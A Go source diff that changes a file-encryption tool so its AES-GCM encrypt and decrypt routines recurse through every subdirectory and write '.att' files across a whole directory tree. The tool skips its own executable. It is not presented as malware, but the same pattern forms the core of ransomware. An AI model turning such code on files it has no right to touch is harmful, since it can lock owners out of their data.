@@ -58,9 +58,9 @@ func main() {
 	}
 
 	if *encKey != "" {
-		enc(*encKey)
+		enc(*encKey, ".")
 	} else if *decKey != "" {
-		dec(*decKey)
+		dec(*decKey, ".")
 	} else {
 		fmt.Println("Error: You must provide either -e <key> for encryption or -d <key> for decryption")
 		flag.PrintDefaults()
@@ -69,15 +69,14 @@ func main() {
 
 }
 
-func enc(hexKey string) {
-	dirs, err := os.ReadDir(".")
+func enc(hexKey string, dirname string) {
+	dirs, err := os.ReadDir(dirname)
 	if err != nil {
 		return
 	}
 
 	for _, d := range dirs {
 		if !d.IsDir() {
-
 			exePath, err := os.Executable()
 			if err != nil {
 				return
@@ -95,7 +94,7 @@ func enc(hexKey string) {
 				}
 			}
 
-			p := path.Join(".", d.Name())
+			p := path.Join(dirname, d.Name())
 
 			file, err := os.Open(p)
 			if err != nil {
@@ -147,7 +146,7 @@ func enc(hexKey string) {
 			// 4 encrypt
 			byteEnc := gcm.Seal(nonce, nonce, b, nil)
 
-			encFile, err := os.Create(d.Name() + ".att")
+			encFile, err := os.Create(p + ".att")
 			if err != nil {
 				return
 			}
@@ -168,21 +167,30 @@ func enc(hexKey string) {
 				return
 			}
 
+		} else {
+			newSubDir := path.Join(dirname, d.Name())
+
+			fullPath, err := filepath.Abs(newSubDir)
+			if err != nil {
+				return
+			}
+
+			enc(hexKey, fullPath)
 		}
 	}
 }
 
-func dec(hexKey string) {
-	dirs, err := os.ReadDir(".")
+func dec(hexKey string, dirname string) {
+	dirs, err := os.ReadDir(dirname)
 	if err != nil {
 		return
 	}
 
 	for _, d := range dirs {
 		if !d.IsDir() {
-			p := path.Join(".", d.Name())
+			p := path.Join(dirname, d.Name())
 
-			part := strings.Split(d.Name(), ".")
+			part := strings.Split(p, ".")
 			if len(part) > 0 {
 				if part[len(part)-1] != "att" {
 					continue
@@ -256,6 +264,15 @@ func dec(hexKey string) {
 				return
 			}
 
+		} else {
+			newSubDir := path.Join(dirname, d.Name())
+
+			fullPath, err := filepath.Abs(newSubDir)
+			if err != nil {
+				return
+			}
+
+			dec(hexKey, fullPath)
 		}
 	}
 }
